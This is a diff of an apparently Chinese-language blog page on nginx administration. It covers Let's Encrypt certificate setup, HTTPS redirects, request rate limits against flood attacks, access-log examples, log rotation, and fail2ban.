-<p><a href="https://www.linode.com/docs/security/ssl/install-lets-encrypt-to-create-ssl-certificates/">Install Let’s Encrypt to Create SSL Certificates</a><br>linode的教程非常实用，基本上就是这几条：<br>注意，该过程需要请求网络，所以事先把nginx关掉，保证80和443端口都是没人在用的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://github.com/letsencrypt/letsencrypt /opt/letsencrypt</span><br><span class="line"><span class="built_in">cd</span> /opt/letsencrypt</span><br><span class="line">sudo -H ./letsencrypt-auto certonly --standalone -d example.com -d www.example.com <span class="comment">##多一个二级域名就要多一个-d,就是说得一个个的写，不支持*.example.com这种</span></span><br><span class="line">sudo ls /etc/letsencrypt/live <span class="comment">##一切顺利的话，生成的证书都在这里了</span></span><br><span class="line">./certbot-auto certificates <span class="comment">##看下我当前都有哪些证书</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 接下来是自动续期环节</span></span><br><span class="line">sudo -H ./letsencrypt-auto certonly --standalone --renew-by-default -d example.com -d www.example.com <span class="comment">##就是多了renew-by-default这个参数，因为这个免费证书默认是三个月的有效期。</span></span><br></pre></td></tr></table></figure></p>
-<p>强制http导向https的方法也很多<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line"></span><br><span class="line">    server_name _;</span><br><span class="line"></span><br><span class="line">    return 301 https://$host$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>防止cc攻击：<br>nginx http配置：</p>
+<p><a href="https://www.linode.com/docs/security/ssl/install-lets-encrypt-to-create-ssl-certificates/">Install Let’s Encrypt to Create SSL Certificates</a><br>linode的教程非常实用，基本上就是这几条：<br>注意，该过程需要请求网络，所以事先把nginx关掉，保证80和443端口都是没人在用的</p>
+<pre><code class="bash">sudo git clone https://github.com/letsencrypt/letsencrypt /opt/letsencrypt
+cd /opt/letsencrypt
+sudo -H ./letsencrypt-auto certonly --standalone -d example.com -d www.example.com ##多一个二级域名就要多一个-d,就是说得一个个的写，不支持*.example.com这种
+sudo ls /etc/letsencrypt/live ##一切顺利的话，生成的证书都在这里了
+./certbot-auto certificates ##看下我当前都有哪些证书
+
+## 接下来是自动续期环节
+sudo -H ./letsencrypt-auto certonly --standalone --renew-by-default -d example.com -d www.example.com ##就是多了renew-by-default这个参数，因为这个免费证书默认是三个月的有效期。
+</code></pre>
+<p>强制http导向https的方法也很多</p>
+<pre><code>server {
+    listen 80 default_server;
+
+    server_name _;
+
+    return 301 https://$host$request_uri;
+}
+</code></pre><p>防止cc攻击：<br>nginx http配置：</p>
 <pre><code>#请求数量控制，每秒20个
 limit_req_zone $binary_remote_addr zone=one:10m rate=20r/s;
 #并发限制30个
@@ -412,8 +957,13 @@ limit_req zone=one burst=5;
 limit_conn addr 30;
 </code></pre><p>正常的请求log应该长这样<br>111.111.111.111 - - [01/Nov/2017:01:30:30 -0400] “GET /favicon.ico HTTP/2.0” 200 3769 “<a href="https://www.baidu.com/">https://www.baidu.com/</a>“ “Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36”    </p>
 <p>不正常的请求log长成这样<br>117.111.27.194 - - [01/Nov/2017:02:43:06 -0400] “GET / HTTP/1.1” 301 178 “-“ “-“ ##server-name和user-agent都没有</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen 80 default_server;</span><br><span class="line">  server_name _; //这种可以匹配server-name为空的请求</span><br><span class="line">  return 404;</span><br><span class="line">  access_log off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><a href="https://marskid.net/2018/02/04/nginx-deny-web-scanner/">还可以把这种网络扫描的程序导入到受限的服务中</a></p>
+<pre><code>server {
+  listen 80 default_server;
+  server_name _; //这种可以匹配server-name为空的请求
+  return 404;
+  access_log off;
+}
+</code></pre><p><a href="https://marskid.net/2018/02/04/nginx-deny-web-scanner/">还可以把这种网络扫描的程序导入到受限的服务中</a></p>
 <p>在ubuntu18.04上，logrotate似乎默认已经被安装过了，所以，每天/var/log/nginx里面的文件都会被gzip一遍</p>
 <p>有时候会在error.log里面看到这样的话：<br>accept4() failed (24: Too many open files)<br>cat /proc/sys/fs/file-max ##这个值是跟系统内存相关的</p>
 <p><a href="https://www.digitalocean.com/community/tutorials/how-to-protect-an-nginx-server-with-fail2ban-on-ubuntu-14-04">用failtoban降低被攻击概率</a></p>
